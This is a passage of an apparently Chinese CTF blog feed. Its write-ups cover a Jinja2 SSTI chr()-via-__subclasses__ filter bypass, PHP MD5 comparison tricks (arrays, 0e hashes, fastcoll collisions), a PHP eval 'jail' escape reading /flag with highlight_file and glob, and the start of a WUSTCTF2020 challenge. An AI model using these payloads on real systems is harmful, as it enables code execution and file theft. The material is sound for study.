class="headerlink" title="chr函数"></a>chr函数</h3><p>当我们需要绕过一些特殊字符过滤时，比如斜杠&#x2F;，空格时，可以先去找<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类然后去找到chr函数并调用，通过</p><p><code>&#123;%set chr=xxx%&#125;</code>去构造出一个chr函数，然后就能通过ascii码值去构造出这些特殊字符</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>= <span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_bui&#x27;</span><span class="hljs-string">&#x27;ltins_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;chr&#x27;</span>]%&#125;<br>&#123;% <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)) %&#125;<br><br><span class="hljs-comment">#/</span><br><br><span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)<span class="hljs-comment">#/</span><br><span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>)<span class="hljs-comment">#空格</span><br><br>通过~符号拼接构造出命令<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>= <span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_bui&#x27;</span><span class="hljs-string">&#x27;ltins_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;chr&#x27;</span>]%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd=<span class="hljs-string">&#x27;cat &#x27;</span>~<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)~<span class="hljs-string">&#x27;flag&#x27;</span> %&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p>除了使用chr函数添加ascii码参数构造特殊字符外，还可以使用python的格式化字符来生成特殊字符<br>例如：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&#x27;%c&#x27;</span> <span class="hljs-meta">%</span> <span class="hljs-comment">(47)</span> 会输出字符串 /<br><br><br>然后~符号通过拼接构造出命令<br>&#123;<span class="hljs-meta">%</span> set cmd=<span class="hljs-string">&#x27;cat &#x27;</span>~<span class="hljs-string">&#x27;%c&#x27;</span><span class="hljs-meta">%</span><span class="hljs-comment">(47)</span>~<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> ssti </tag>
            
            <tag> chr函数构造命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>所以你说你懂MD5?</title>
      <link href="/2025/03/26/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5/"/>
      <url>/2025/03/26/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5/</url>
      
        <content type="html"><![CDATA[<h1 id="所以你说你懂MD5"><a href="#所以你说你懂MD5" class="headerlink" title="所以你说你懂MD5?"></a>所以你说你懂MD5?</h1><p>首先先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>); 加强难度就不会了?<br></code></pre></td></tr></table></figure><hr><p>第一个地方用的强比较，可以利用数组绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span>：<br><span class="hljs-attribute">apple</span>[]=<span class="hljs-number">1</span>&amp;banana[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第二个地方对我们传入的值进行了String强转，不能用数组绕过了，会变成Array，可以使用科学计数法绕过，可以利用第二个地方的弱比较, 让 <code>0e</code> 开头的字符串使 php 误认为是科学计数法, 从而转换为 0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apple</span>[]=<span class="hljs-number">1</span>&amp;banana[]=<span class="hljs-number">2</span>&amp;apppple=<span class="hljs-number">240610708</span>&amp;bananana=<span class="hljs-number">314282422</span><br></code></pre></td></tr></table></figure><p>第三个地方两个判断都是强比较，这时就只能用MD5强碰撞就是需要找到真实的 MD5 值一致的内容, 我们可以使用 fastcoll 工具</p><p>通过调用：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">fastcoll</span> -o a <span class="hljs-built_in">a1</span><br></code></pre></td></tr></table></figure><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="MD5强碰撞工具fastcoll使用"><a href="#MD5强碰撞工具fastcoll使用" class="headerlink" title="MD5强碰撞工具fastcoll使用"></a>MD5强碰撞工具fastcoll使用</h3><p>终端打开</p><p>然后输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fastcoll</span> -o <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5-1.png"></p><p>由于生成的文件是十六进制编码后的结果，这里用hxd打开，可以看到生成的1.txt和2.txt都有初始的aleicnb</p><p>在windows终端中输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">certutil</span> -hashfile <span class="hljs-number">1</span>.txt MD5<br><span class="hljs-attribute">certutil</span> -hashfile <span class="hljs-number">2</span>.txt MD5<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5-4.png"></p><p>可以发现这两个文件的MD5值相同</p><p><img src="/../image/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5-3.png"></p><p>从两个文件获取内容和md5值，用url编码输出不可见字符</p><p><img src="/../image/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5-2.png"></p><p>这样得到了一串不相等但是md5值相等的字符内容，可以在url传参或者在php内部进行url解码一下</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php特性 </tag>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ez_php_jail</title>
      <link href="/2025/03/26/ez-php-jail/"/>
      <url>/2025/03/26/ez-php-jail/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h1><p>首先启动靶机并访问。上来就能看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hint.html&quot;</span>);<br><span class="hljs-variable">$Jail</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Jail_by.Happy&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Jail</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Do You Like My Jail?&quot;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Like_Jail</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">Like_Jail</span>(<span class="hljs-variable">$Jail</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$Jail</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You will Jail in your life!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// 在HTML解析后再输出PHP源代码</span><br><br><span class="hljs-meta">?&gt;</span><br><br><br>Welcome to My Jail<br>Do You Like My Jail?<br></code></pre></td></tr></table></figure><p>很明显要我们利用eval危险函数来进行命令执行。</p><p>首先看到这个传参$Jail &#x3D; $_GET[‘Jail_by.Happy’];，很明显是PHP GET传参特性</p><p><strong>当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</strong></p><p><strong>个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?Jail[<span class="hljs-keyword">by</span>.Happy=<br></code></pre></td></tr></table></figure><hr><p>然后要经过一次正则过滤，</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">(preg_match(&#x27;/(`|<span class="hljs-string">\$</span>|<span class="hljs-string">a</span>|<span class="hljs-string">c</span>|<span class="hljs-string">s</span>|<span class="hljs-string">require</span>|<span class="hljs-string">include)/i&#x27;, $var)</span><br></code></pre></td></tr></table></figure><p>查看源代码，发现提示我们访问一个文件<code>ph0_info_Like_jail.php</code></p><p>访问之后发现是一个phpinfo页面，里面我们能看到禁用了很多函数</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">disable_functions<br><br>exec,passthru,shell_exec,<span class="hljs-keyword">system</span>,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,<span class="hljs-built_in">require</span>,require_once,<span class="hljs-built_in">include</span>,include_once,<span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><hr><p>发现没有过滤highlight_file函数，完美绕过正则和禁用函数</p><p>payload：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?Jail[<span class="hljs-keyword">by</span>.Happy=highlight_file(<span class="hljs-keyword">glob</span>(<span class="hljs-string">&quot;/f*&quot;</span>)[0]);<br></code></pre></td></tr></table></figure><p>这里用到了glob函数</p><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="glob函数"><a href="#glob函数" class="headerlink" title="glob函数"></a>glob函数</h3><ul><li>这是 PHP 中的函数调用，用于查找文件。</li><li><code>glob</code> 是一个标准的 PHP 函数，接受一个模式作为参数，并返回匹配该模式的文件路径。</li></ul><p><strong>用法</strong>：</p><ul><li>返回值是一个数组，其中包含所有符合条件的文件名。如果找到了符合条件的文件，<code>glob()</code> 会列出这些文件。</li></ul><p>例如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">glob</span><span class="hljs-params">(<span class="hljs-string">&quot;/f*&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li><code>&quot;/f*&quot;</code> 表示在根目录下查找所有以 <code>f</code> 开头的文件和目录。</li></ul><p>glob(“&#x2F;f*”)[0]表示数组中第0位的文件名</p><hr><h3 id="glob伪协议"><a href="#glob伪协议" class="headerlink" title="glob伪协议"></a>glob伪协议</h3><ul><li><p><code>glob</code> 伪协议通常用于以特定的语法描述如何查找匹配方式的文件，利用通配符（例如 <code>*</code> 和 <code>?</code>）来指定文件名模式。</p></li><li><p>通配符</p><p>：</p><ul><li><code>*</code> 表示零个或多个字符。</li><li><code>?</code> 表示单个字符。</li></ul></li><li><p><strong>伪协议格式</strong>：可以考虑一种类似于 <code>glob:///path/to/files/*.txt</code> 的格式，这表示在指定目录下查找所有以 <code>.txt</code> 结尾的文件。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> glob函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020-朴实无华1</title>
      <link href="/2025/03/25/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/"/>
      <url>/2025/03/25/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/</url>
      
        <content type="html"><![CDATA[<h1 id="WUSTCTF2020-朴实无华1"><a href="#WUSTCTF2020-朴实无华1" class="headerlink" title="WUSTCTF2020-朴实无华1"></a>WUSTCTF2020-朴实无华1</h1><p>启动靶机并访问，发现啥也没有，访问&#x2F;url&#x2F;robots.txt</p><p><img src="/../image/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1-1.png"></p><p>找到个&#x2F;fAke_f1agggg.php</p><p>访问一下</p><p><img src="/../image/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1-2.png"></p><p>发现不是flag，我们抓包看看，抓<code>http://ac5d9feb-9ba3-4337-97aa-811aa139dfa0.node5.buuoj.cn:81/fAke_f1agggg.php</code>的包</p><p><img src="/../image/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1-3.png"></p><p>发现一个&#x2F;fl4g.php</p><p>我们访问一下，要开始熟悉的代码审计了，这里在谷歌浏览器一堆乱码，在火狐里打开按alt然后点查看，修复页面编码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>Warning: Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/fl4g.<span class="hljs-attr">php</span>:<span class="hljs-number">2</span>) in /<span class="hljs-keyword">var</span>/www/html/fl4g.php on line <span class="hljs-number">3</span><br>&lt;img src=<span class="hljs-string">&quot;/img.jpg&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 